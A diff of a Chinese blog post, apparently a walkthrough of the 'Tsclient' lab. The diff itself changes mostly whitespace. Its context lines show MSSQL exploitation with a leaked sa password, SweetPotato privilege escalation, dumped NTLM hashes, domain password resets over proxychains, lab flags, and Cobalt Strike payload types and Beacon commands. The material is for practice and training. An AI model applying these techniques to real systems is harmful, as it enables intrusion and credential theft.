@@ -12,7 +12,6 @@ authors:
 draft: false              # 设为 true 则为草稿
 slug: "tsclient"          # 随机URL字符串
 ---
-<meta name="referrer" content="no-referrer">
 
 # 春秋云境-Tsclient&Cobalt Strike学习
 
@@ -48,7 +47,7 @@ Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩
 [21.5s]     扫描已完成: 3/3
 ```
 
-扫描 发现是 IIS 服务 
+扫描 发现是 IIS 服务
 
 然后扫描到 MSSQL 密码泄露
 
@@ -57,7 +56,7 @@ Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩
 ##  flag01
 连接上来
 
-4 个模式，经过测试 SpOA 可以执行命令 
+4 个模式，经过测试 SpOA 可以执行命令
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280363704-8ed08222-77b9-4651-bff6-486cd1f82e7d.png)
 
@@ -73,11 +72,11 @@ Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩
 C:/迅雷下载/SweetPotato.exe -a "type C:\Users\Administrator\flag\flag01.txt"
 ```
 
-结果如下 
+结果如下
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280897682-c135bd83-8927-44e6-b87c-95cca6d7aff0.png)
 
-继续渗透 
+继续渗透
 
 ## flag02
 根据题目要求我们上线 CS，用 system 权限给，不然什么也干不了
@@ -112,8 +111,6 @@ John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::
 
 系统禁用了 LM 哈希的存储（这是现代 Windows 系统的默认安全设置）。
 
-
-
 查看在线用户可以发现还存在一个 John 用户
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754281697142-31936f09-d7c5-44db-bd54-68593ba36794.png)
@@ -125,7 +122,7 @@ John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282000893-240e4c7b-1a50-4981-974e-8bbb0115e232.png)
 
-可以发现注入成功，这里也是上线了 
+可以发现注入成功，这里也是上线了
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754281985693-fb1d680b-1113-4475-b8b2-f5ea555f664f.png)
 
@@ -190,7 +187,7 @@ http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server
 MSSQL 172.22.8.18:1433 sa 1qaz!QAZ
 ```
 
-18 机子我们已经拿下来了 
+18 机子我们已经拿下来了
 
 根据刚才的提示，继续上 chisel 代理一下
 
@@ -240,7 +237,7 @@ SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald
 SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
 ```
 
-利用脚本批量改下密码 
+利用脚本批量改下密码
 
 ```python
 proxychains python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'U*MT%yB22fU5aT'
@@ -409,14 +406,11 @@ flag03: flag{47227631-3839-45c1-ae12-8fe7a6d876f6}
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293301319-fa58f1e9-2043-4c37-975f-8ad4fa71940e.png)
 
-
-
 ## Others
 ### Cobalt Strike
 可能现在都用的是 CS 的衍生工具
 
 #### 搭建 cs 平台
-
 
 如何配置 CS 看下面这个文章
 
@@ -441,9 +435,7 @@ sudo apt install openjdk-11-jdk
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279352877-f92716f4-9172-4136-9e50-8976025d4a14.png)
 
-
-
-#### Payload 种类和选择 
+#### Payload 种类和选择
 1. **HTML Application**
     - 生成一个 .hta 格式的恶意 HTML 应用程序，适合用于钓鱼邮件、Web social engineering 等场景，在目标浏览器中执行后触发 payload。
 2. **MS Office Macro**
@@ -462,8 +454,6 @@ sudo apt install openjdk-11-jdk
     - 适合直接部署到 Windows 靶机，执行后直接上线。
 7. **Windows Stageless Generate All Payloads**
     - 一次性为 Windows 平台生成所有主流格式的"一步到位"payload，比如 exe、dll、ps1、bin 等。
-
-
 
 #### Beacon 内置命令
 ```python
@@ -560,8 +550,6 @@ unlink			断开与beacon的连接（用于通过TCP、命名管道连接的beaco
 upload			上传文件
 !			运行历史命令
 ```
-
-
 
 ### smbpasswd.py 存档
 [https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py](https://lira.epac.to/DOCS/python3-impacket/examples/smbpasswd.py)
